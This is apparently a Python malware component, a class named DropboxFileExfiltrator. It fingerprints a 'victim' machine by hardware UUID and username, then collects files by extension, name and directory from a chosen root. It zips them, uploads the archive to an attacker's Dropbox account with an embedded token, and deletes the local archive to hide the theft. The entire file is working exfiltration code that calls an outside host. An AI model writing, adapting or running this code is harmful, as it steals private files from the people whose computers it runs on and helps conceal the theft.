import os
import subprocess
import dropbox
import zipfile
import shutil
from time import time


class DropboxFileExfiltrator:

    @staticmethod
    def get_target_filepaths(root, exts, names, dirs) -> set:
        # -> [files, dirs]
        target_filepaths = set()
        for name in names:
            target_filepaths.add(name)
        for parent, dirnames, fnames in os.walk(root):
            for fname in fnames:
                curr_filepath = os.path.join(parent, fname)
                if os.path.splitext(fname)[-1] in exts or parent in dirs:
                    target_filepaths.add(curr_filepath)
        return target_filepaths

    def __init__(self, config):
        self.config = config
        self._victim_hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(' ')[0]
        self._victim_username = os.getlogin()
        substr_replacements: dict = {
            '`hwid`': self._victim_hwid,
            '`victim_username`': self._victim_username
        }
        # replace special substrs in config
        for key in self.config.keys():
            if type(self.config[key]) is not str:
                continue
            for old_substr, new_substr in substr_replacements.items():
                self.config[key] = self.config[key].replace(old_substr, new_substr)
            
    def run(self) -> None:
        output_master_zip_filepath = os.path.join(
            self.config['output_zip_dirpath'],
            str(round(time() * 1000))+'.zip'
        )
        target_filepaths = self.get_target_filepaths(
            self.config['root_dirpath'],
            self.config['target_file_extensions'],
            self.config['target_filepaths'],
            self.config['target_dirpaths']
        )
        # add the target files and the zipped dirs to the master zip file
        with zipfile.ZipFile(output_master_zip_filepath, 'w', compression=zipfile.ZIP_DEFLATED) as zfh:
            # may hit files that were deleted after being indexed
            for filepath in target_filepaths:
                try:
                    zfh.write(filepath)
                #except FileNotFoundError:
                except Exception as e:
                    print(e)
                    pass
        # exfiltrate the master zip file
        output_filename = os.path.basename(output_master_zip_filepath)
        dropbox_filepath = (self.config['output_dropbox_dirpath'] + '/' + output_filename).replace('//', '/')
        dbx = dropbox.Dropbox(self.config['dropbox_token'])
        with open(output_master_zip_filepath, 'rb') as f:
            dbx.files_upload(f.read(), dropbox_filepath)
        # remove the master zipfile
        os.remove(output_master_zip_filepath)